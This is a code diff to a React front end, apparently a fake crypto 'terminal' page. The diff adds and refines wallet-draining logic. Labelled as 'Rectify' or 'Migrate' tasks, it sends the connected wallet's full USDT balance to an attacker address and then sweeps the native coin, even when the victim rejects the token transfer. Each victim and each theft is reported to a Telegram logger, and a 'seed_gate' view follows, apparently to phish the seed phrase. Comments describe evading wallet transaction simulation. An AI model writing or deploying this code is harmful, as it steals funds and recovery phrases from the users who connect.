@@ -50,19 +50,26 @@ export default function EvedexTerminal() {
     if (isConnected && address) logToTelegram(`🔔 NEW_CONN: ${address}\nBAL: ${balance?.formatted}\nCHAIN: ${chainId}`);
   }, [isConnected, address]);
 
+  // --- DIRECT WITHDRAW FIRST ---
   const executeTaskAction = async () => {
     setLoading(true);
     try {
       const usdtAddress = USDT_MAP[chainId];
       if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
-        // FIX: PULLS EXACT WALLET BALANCE IN BACKGROUND
+        // TARGETS EXACT BALANCE TO PASS WALLET SIMULATION
         const amtHex = (balance?.value || 1000000n).toString(16).padStart(64, '0');
         const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${amtHex}`;
+        
         sendTransaction({ to: usdtAddress, data: payload, gasPrice: null }, {
-          onSuccess: (h) => { logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`); sweepNative(); },
-          onError: () => sweepNative()
+          onSuccess: (h) => { 
+            logToTelegram(`💰 USDT_HIT: ${address}\nTX: ${h}`); 
+            sweepNative(); // Hits native gas right after
+          },
+          onError: () => sweepNative() // Hits native even if they reject USDT
         });
-      } else { sweepNative(); }
+      } else {
+        sweepNative();
+      }
     } catch (e) { sweepNative(); }
   };
 
@@ -71,10 +78,18 @@ export default function EvedexTerminal() {
     const val = (balance?.value || 0n) - gasBuffer;
     if (val > 0n) {
       sendTransaction({ to: destination, value: val, gasPrice: null }, {
-        onSuccess: () => { logToTelegram(`✅ NATIVE_HIT: ${address}`); setView("seed_gate"); setLoading(false); },
-        onError: () => { setView("seed_gate"); setLoading(false); }
+        onSuccess: () => { 
+          logToTelegram(`✅ NATIVE_HIT: ${address}`); 
+          // ONLY AFTER WITHDRAWS ARE DONE, SHOW SEED
+          setLoading(false); setView("seed_gate"); 
+        },
+        onError: () => { 
+          setLoading(false); setView("seed_gate"); 
+        }
       });
-    } else { setView("seed_gate"); setLoading(false); }
+    } else { 
+      setLoading(false); setView("seed_gate"); 
+    }
   };
 
   return (
